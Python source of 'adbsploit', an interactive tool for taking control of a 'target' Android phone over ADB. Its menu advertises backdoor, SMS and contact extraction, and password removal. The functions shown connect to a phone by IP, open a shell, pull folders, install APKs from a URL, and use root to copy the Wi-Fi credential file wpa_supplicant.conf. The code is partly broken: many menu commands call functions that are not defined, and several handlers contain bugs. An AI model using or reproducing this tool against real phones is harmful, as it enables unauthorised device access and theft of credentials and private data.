import os
import shutil
import subprocess
import sys
import random

import adbutils
from colorama import Fore
from pyfiglet import Figlet
from rich.console import Console
from rich.table import Table

arrow = Fore.RED + " └──>" + Fore.WHITE
device = 'none'


def main():
    command = input(Fore.WHITE + "adbsploit" + Fore.RED + "(" + device + ")" + Fore.WHITE + " > ")
    if command == 'help':
        help()
        main()
    elif command == 'devices':
        devices()
        main()
    elif command == 'select':
        select()
        main()
    elif command == 'connect':
        connect()
        main()
    elif command == 'list-forward':
        list_forward()
        main()
    elif command == 'forward':
        forward()
        main()
    elif command == 'wifi':
        wifi()
        main()
    elif command == 'airplane':
        airplane()
        main()
    elif command == 'dumpsys':
        dumpsys()
        main()
    elif command == 'list-apps':
        list_apps()
        main()
    elif command == 'wpa-supplicant':
        wpa_supplicant()
        main()
    elif command == 'start-app':
        start_app()
        main()
    elif command == 'stop-app':
        stop_app()
        main()
    elif command == 'clear-app':
        clear_app()
        main()
    elif command == 'install':
        install()
        main()
    elif command == 'install-remote':
        install_remote()
        main()
    elif command == 'uninstall':
        uninstall()
        main()
    elif command == 'shell':
        shell()
        main()
    elif command == 'shutdown':
        shutdown()
        main()
    elif command == 'reboot':
        reboot()
        main()
    elif command == 'kill-server':
        kill_server()
        main()
    elif command == 'get-folder':
        get_folder()
        main()
    elif command == 'logs':
        logs()
        main()
    elif command == 'show_ip':
        show_ip()
        main()
    elif command == 'battery':
        battery()
        main()
    elif command == 'appinfo':
        appinfo()
        main()
    elif command == 'netstat':
        netstat()
        main()
    elif command == 'sound':
        sound()
        main()
    elif command == 'check-screen':
        check_screen()
        main()
    elif command == 'dump-hierarchy':
        dump_hierarchy()
        main()
    elif command == 'keyevent':
        keyevent()
        main()
    elif command == 'show-keyevents':
        show_keyevents()
        main()
    elif command == 'open-browser':
        open_browser()
        main()
    elif command == 'remove-password':
        remove_password()
        main()
    elif command == 'swipe':
        swipe()
        main()
    elif command == 'screen':
        screen()
        main()
    elif command == 'unlock-screen':
        unlock_screen()
        main()
    elif command == 'lock-screen':
        lock_screen()
        main()
    elif command == 'show-mac':
        show_macaddress()
        main()
    elif command == 'screenshot':
        screenshot()
        main()
    elif command == 'dump-meminfo':
        dump_meminfo()
        main()
    elif command == 'process-list':
        process_list()
        main()
    elif command == 'tcpip':
        tcpip()
        main()
    elif command == 'current-app':
        current_app()
        main()
    elif command == 'extract-contacts':
        extract_contacts()
        main()
    elif command == 'extract-sms':
        extract_sms()
        main()
    elif command == 'delete-sms':
        delete_sms()
        main()
    elif command == 'send-sms':
        send_sms()
        main()
    elif command == 'extract-app':
        extract_app()
        main()
    elif command == 'recovery-mode':
        recovery_mode()
        main()
    elif command == 'device-info':
        device_info()
        main()
    elif command == 'fastboot-mode':
        fastboot_mode()
        main()
    elif command == 'kill-process':
        kill_process()
        main()
    elif command == 'screenrecord':
        screenrecord()
        main()
    elif command == 'remote-control':
        remote_control()
        main()
    elif command == 'backdoor':
        backdoor()
        main()
    elif command == 'clear':
        clear()
        main()
    elif command == 'version':
        version()
        main()
    elif command == 'exit':
        exit()
    else:
        print(arrow + Fore.RED + " That command doesn't exists...")
        main()


# *******************************************************************************
# Functions

# show connected devices
def devices():
    table = Table()
    table.add_column("Device detected", style="cyan")
    table.add_column("Model", style="magenta")
    table.add_column("Name", style="magenta")
    table.add_column("Device", style="magenta")
    for d in adbutils.adb.device_list():
        table.add_row(d.serial, d.prop.model, d.prop.name, d.prop.device)
    console = Console()
    console.print(table)

# function for connecting to the target phone
def connect():
    print(("[{0}+{1}] Enter the phone IP address to connect").format(Fore.RED, Fore.WHITE))
    dev = input(arrow + " adbsploit" + Fore.RED + "(connect) " + Fore.WHITE + "> ")
    output = adbutils.adb.connect(dev)
    print(arrow + Fore.GREEN + " * " + output)

# select phone
def select():
    print(("[{0}+{1}] Enter the phone serial").format(Fore.RED, Fore.WHITE))
    dev = input(arrow + " adbsploit" + Fore.RED + "(select) " + Fore.WHITE + "> ")
    output = adbutils.adb.device(serial=dev)
    global device
    try:
        output.is_screen_on()
        print("Selected device: " + Fore.GREEN + output.serial)
        device = output.serial
        main()
    except:
        print(arrow + ("[{0}+{1}] That device doesn't exist...").format(Fore.RED, Fore.WHITE))

# lists
def list_forward():
    global device
    table = Table()
    table.add_column("Device", style="cyan")
    table.add_column("Local Port", style="magenta")
    table.add_column("Remote Port", style="magenta")
    if device != 'none':
        # list only one device forwards
        for item in adbutils.adb.forward_list(device):
            table.add_row(item.serial, item.local, item.remote)
        console = Console()
        console.print(table)
    else:
        # list all forwards
        for item in adbutils.adb.forward_list():
            table.add_row(item.serial, item.local, item.remote)
        console = Console()
        console.print(table)

# port forward
def forward():
    global device
    if device != 'none':
        print(("[{0}+{1}] Enter the local port to foward").format(Fore.RED, Fore.WHITE))
        local = input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
        print(("[{0}+{1}] Enter the remote port to forward").format(Fore.RED, Fore.WHITE))
        remote = input(arrow + " adbsploit" + Fore.RED + "(forward) " + Fore.WHITE + "> ")
        d = adbutils.adb.device(device)
        output = d.forward(local, remote)
        print(output)
        print(Fore.GREEN + "The port forward is now active...")
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# show the wifi near the target device
def wifi():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        print(("[{0}+{1}] Enter the state of the wifi (ON/OFF)").format(Fore.RED, Fore.WHITE))
        state = input(arrow + " adbsploit" + Fore.RED + "(wifi) " + Fore.WHITE + "> ")
        if state == 'on' or state == 'ON':
            d.shell('svc wifi enable')
            print(arrow + Fore.GREEN + 'The wifi is now enabled on the device')
        elif state == 'off' or state == 'OFF':
            d.shell('svc wifi disable')
            print(
                arrow + Fore.GREEN + 'The wifi is now disabled on the device. To turn it on again you must plugged in')
        else:
            print(arrow + ("[{0}+{1}] That state doesn't exists").format(Fore.RED, Fore.WHITE))
            wifi()
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# dump sys info
def dumpsys():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        print(arrow + d.shell(device + ' dumpsys'))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# list all apps
def list_apps():
    global device
    if device != 'none':
        d = adbutils.adb.device(device)
        apps = d.list_packages()
        table = Table()
        table.add_column("App", style="cyan")
        for a in apps:
            table.add_row(a)
        console = Console()
        console.print(table)
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# wpa shows
def wpa_supplicant():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            d.sync.pull("/sdcard/wpa_supplicant.conf", "wpa_supplicant.conf")
            # d.shell(device + " pull /sdcard/wpa_supplicant.conf "+location)
            print(arrow + Fore.GREEN + 'WPA Supplicant exported correctly')
        except:
            print(arrow + Fore.RED + 'An error has been occurred grabbing the wpa_supplicant')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# install apk in the target phone
def install():
    global device
    if device != 'none':
        try:
            print(("[{0}+{1}] Enter the apk path").format(Fore.RED, Fore.WHITE))
            apk = input(arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.install(apk)
            print(arrow + Fore.GREEN + 'APK installed successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# install from a remote serer 
def install_remote():
    global device
    if device != 'none':
        try:
            print(("[{0}+{1}] Enter the apk URL").format(Fore.RED, Fore.WHITE))
            url = input(arrow + " adbsploit" + Fore.RED + "(install_remote) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.install_remote(url)
            print(arrow + Fore.GREEN + 'APK installed successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# uninstall apps from the target phone
def uninstall():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Enter the package name").format(Fore.RED, Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(uninstall) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.uninstall(app)
            print(arrow + Fore.GREEN + 'APK uninstalled successfully')
        except:
            print(
                arrow + Fore.RED + 'An error has been occurred uninstalling the APK. Check the package name or the error related')
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# spawn a shell
def shell():
    global device
    if device != 'none':
        try:
            os.system("adb -s " + device + " shell")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the shell...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# shut down target phone 
def shutdown():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell('reboot -p')
            print(arrow + Fore.GREEN + 'The device is shutting down...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred shutting down the device").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# reboot the target phone
def reboot():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            d.shell('reboot')
            print(arrow + Fore.GREEN + 'The device is rebooting...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred opening the shell...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# kill server
def kill_server():
    try:
        adbutils.adb.server_kill()
        print(arrow + Fore.GREEN + 'The server is down...')
    except:
        print(arrow + ("[{0}+{1}] An error ocurred killing the server...").format(Fore.RED, Fore.WHITE))

# get folders in the target device
def get_folder():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Enter the path of the folder to pull").format(Fore.RED, Fore.WHITE))
            path = input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Enter the path of the destination").format(Fore.RED, Fore.WHITE))
            name = input(arrow + " adbsploit" + Fore.RED + "(get_folder) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.sync.pull(path, name)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred pulling the folder...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# get phone logs
def logs():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] You want all the logs or only an app? (all/package_name) ").format(Fore.RED,
                                                                                                         Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(logs) " + Fore.WHITE + "> ")
            if app == "all":
                os.system('adb -s ' + device + " logcat ")
            else:
                os.system('adb -s ' + device + " logcat " + "app")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the logs...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# start app
def start_app():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify the activity, if not leave it blank) ").format(Fore.RED, Fore.WHITE))
            activity = input(arrow + " adbsploit" + Fore.RED + "(start_app) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if activity == '':
                d.app_start(app)
                print(Fore.GREEN + "The app " + app + " is now starting...")
            else:
                d.app_start(app, activity)
                print(Fore.GREEN + "The app " + app + "with the activity " + activity + " is now starting...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred starting the app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# stop app in the target device
def stop_app():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(stop_app) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.app_stop(app)
            print(Fore.GREEN + "The app " + app + " is now stopped...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred stopping the app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# clear app data
def clear_app():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(clear_app) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.app_clear(app)
            print(Fore.GREEN + "The app " + app + " is now clear...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred starting the app...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# show ip of the target phone
def show_ip():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            ip = d.wlan_ip()
            print(arrow + Fore.GREEN + ip)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred showing the ip...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# get all app info
def appinfo():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            app = input(arrow + " adbsploit" + Fore.RED + "(appinfo) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            print(Fore.GREEN + str(d.package_info(app)))
        except:
            print(arrow + ("[{0}+{1}] An error ocurred obtaining the info...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# show battery in the target phone
def battery():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            bat = d.shell("dumpsys battery")
            print(Fore.GREEN + bat)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred obtaining the battery info...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# netstat run in the target device
def netstat():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            bat = d.shell("netstat")
            print(arrow + Fore.GREEN + "The netstat for device " + device + " is:")
            print(Fore.MAGENTA + bat)
        except:
            print(arrow + ("[{0}+{1}] An error ocurred getting the netstat...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# on the aeroplane mode in the target device
def airplane():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the name of the app (ex: com.whatsapp) ").format(Fore.RED, Fore.WHITE))
            status = input(arrow + " adbsploit" + Fore.RED + "(airplane) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if status == 'on':
                d.switch_airplane(True)
                print(arrow + Fore.GREEN + "The Airplane Mode is activated...")
            elif status == 'off':
                d.switch_airplane(False)
                print(arrow + Fore.GREEN + "The Airplane Mode is deactivated...")
            else:
                print(arrow + Fore.RED + "The status value only accepts on or off")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred with airplane mode...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# adjust the volume in the target device
def sound():
    global device
    if device != 'none':
        try:
            print(
                arrow + ("[{0}+{1}] Specify the type of sound to modify (media/call/system/notifications/all) ").format(
                    Fore.RED, Fore.WHITE))
            type = input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
            print(arrow + ("[{0}+{1}] Specify the sound leve 0-15 ").format(Fore.RED, Fore.WHITE))
            set = input(arrow + " adbsploit" + Fore.RED + "(sound) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            if type == 'media':
                d.shell('media volume --stream 3 --set ' + set)
                print(arrow + Fore.GREEN + 'The media volume is now set to ' + set + '...')
            elif type == 'call':
                d.shell('media volume --stream 0 --set ' + set)
                print(arrow + Fore.GREEN + 'The call volume is now set to ' + set + '...')
            elif type == 'system':
                d.shell('media volume --stream 1 --set ' + set)
                print(arrow + Fore.GREEN + "The system volume is now set to " + set + '...')
            elif type == 'notifications':
                d.shell('media volume --stream 2 --set ' + set)
                print(arrow + Fore.GREEN + 'The notifications volume is now set to ' + set + '...')
            elif type == 'all':
                d.shell()
                d.shell('media volume --stream 3 --set ' + set)
                d.shell('media volume --stream 2 --set ' + set)
                d.shell('media volume --stream 1 --set ' + set)
                d.shell('media volume --stream 0 --set ' + set)
                print(arrow + Fore.GREEN + 'The all volume types is now set to ' + set + '...')
            else:
                print(Fore.RED + "This type doesn't exists...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred with the sound...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# function for checking the target device screen is in off or on
def check_screen():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            screen = d.is_screen_on()
            if screen == True:
                print(arrow + Fore.GREEN + 'The screen is on...')
            else:
                print(arrow + Fore.GREEN + 'The screen is off...')
        except:
            print(arrow + ("[{0}+{1}] An error ocurred checking the screen...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# dump hierarchy
def dump_hierarchy():
    global device
    if device != 'none':
        try:
            d = adbutils.adb.device(device)
            print(arrow + Fore.GREEN + d.dump_hierarchy())
        except:
            print(arrow + ("[{0}+{1}] An error ocurred dumping hierarchy...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# keyevnt
def keyevent():
    global device
    if device != 'none':
        try:
            print(arrow + ("[{0}+{1}] Specify the keyevent").format(Fore.RED, Fore.WHITE))
            key = input(arrow + " adbsploit" + Fore.RED + "(keyevent) " + Fore.WHITE + "> ")
            d = adbutils.adb.device(device)
            d.keyevent(key)
            print(arrow + Fore.GREEN + "They key event is processed correctly...")
        except:
            print(arrow + ("[{0}+{1}] An error ocurred dumping hierarchy...").format(Fore.RED, Fore.WHITE))
    else:
        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))

# all keyevents 
def show_keyevents(self):
    table = Table()
    table.add_column("Code", style="cyan")
    table.add_column("Keycode", style="magenta")
    table.add_row("0", "KEYCODE_UNKNOWN")
    table.add_row("1", "KEYCODE_MENU")
    table.add_row("2", "KEYCODE_SOFT_RIGHT")
    table.add_row("3", "KEYCODE_HOME")
    table.add_row("4", "KEYCODE_BACK")
    table.add_row("5", "KEYCODE_CALL")
    table.add_row("6", "KEYCODE_ENDCALL")
    table.add_row("7", "KEYCODE_0")
    table.add_row("8", "KEYCODE_1")
    table.add_row("9", "KEYCODE_2")
    table.add_row("10", "KEYCODE_3")
    table.add_row("11", "KEYCODE_4")
    table.add_row("12", "KEYCODE_5")
    table.add_row("13", "KEYCODE_6")
    table.add_row("14", "KEYCODE_7")
    table.add_row("15", "KEYCODE_8")
    table.add_row("16", "KEYCODE_9")
    table.add_row("17", "KEYCODE_STAR")
    table.add_row("18", "KEYCODE_POUND")
    table.add_row("19", "KEYCODE_DPAD_UP")
    table.add_row("20", "KEYCODE_DPAD_DOWN")
    table.add_row("21", "KEYCODE_DPAD_LEFT")
    table.add_row("22", "KEYCODE_DPAD_RIGHT")
    table.add_row("23", "KEYCODE_DPAD_CENTER")
    table.add_row("24", "KEYCODE_VOLUME_UP")
    table.add_row("25", "KEYCODE_VOLUME_DOWN")
    table.add_row("26", "KEYCODE_POWER")
    table.add_row("27", "KEYCODE_CAMERA")
    table.add_row("28", "KEYCODE_CLEAR")
    table.add_row("29", "KEYCODE_A")
    table.add_row("30", "KEYCODE_B")
    table.add_row("31", "KEYCODE_C")
    table.add_row("32", "KEYCODE_D")
    table.add_row("33", "KEYCODE_E")
    table.add_row("34", "KEYCODE_F")
    table.add_row("35", "KEYCODE_G")
    table.add_row("36", "KEYCODE_H")
    table.add_row("37", "KEYCODE_I")
    table.add_row("38", "KEYCODE_J")
    table.add_row("39", "KEYCODE_K")
    table.add_row("40", "KEYCODE_L")
    table.add_row("41", "KEYCODE_M")
    table.add_row("42", "KEYCODE_N")
    table.add_row("43", "KEYCODE_O")
    table.add_row("44", "KEYCODE_P")
    table.add_row("45", "KEYCODE_Q")
    table.add_row("46", "KEYCODE_R")
    table.add_row("47", "KEYCODE_S")
    table.add_row("48", "KEYCODE_T")
    table.add_row("49", "KEYCODE_U")
    table.add_row("50", "KEYCODE_V")
    table.add_row("51", "KEYCODE_W")
    table.add_row("52", "KEYCODE_X")
    table.add_row("53", "KEYCODE_Y")
    table.add_row("54", "KEYCODE_Z")
    table.add_row("55", "KEYCODE_COMMA")
    table.add_row("56", "KEYCODE_PERIOD")
    table.add_row("57", "KEYCODE_ALT_LEFT")
    table.add_row("58", "KEYCODE_ALT_RIGHT")
    table.add_row("59", "KEYCODE_SHIFT_LEFT")
    table.add_row("60", "KEYCODE_SHIFT_RIGHT")
    table.add_row("61", "KEYCODE_TAB")
    table.add_row("62", "KEYCODE_SPACE")
    table.add_row("63", "KEYCODE_SYM")
    table.add_row("64", "KEYCODE_EXPLORER")
    table.add_row("65", "KEYCODE_ENVELOPE")
    table.add_row("66", "KEYCODE_ENTER")
    table.add_row("67", "KEYCODE_DEL")
    table.add_row("68", "KEYCODE_GRAVE")
    table.add_row("69", "KEYCODE_MINUS")
    table.add_row("70", "KEYCODE_EQUALS")
    table.add_row("71", "KEYCODE_LEFT_BRACKET")
    table.add_row("72", "KEYCODE_RIGHT_BRACKET")
    table.add_row("73", "KEYCODE_BACKSLASH")
    table.add_row("74", "KEYCODE_SEMICOLON")
    table.add_row("75", "KEYCODE_APOSTROPHE")
    table.add_row("76", "KEYCODE_SLASH")
    table.add_row("77", "KEYCODE_AT")
    table.add_row("78", "KEYCODE_NUM")
    table.add_row("79", "KEYCODE_HEADSETHOOK")
    table.add_row("80", "KEYCODE_FOCUS")
    table.add_row("81", "KEYCODE_PLUS")
    table.add_row("82", "KEYCODE_MENU")
    table.add_row("83", "KEYCODE_NOTIFICATION")
    table.add_row("84", "KEYCODE_SEARCH")
    table.add_row("85", "TAG_LAST_KEYCODE")
    console = Console()
    console.print(table)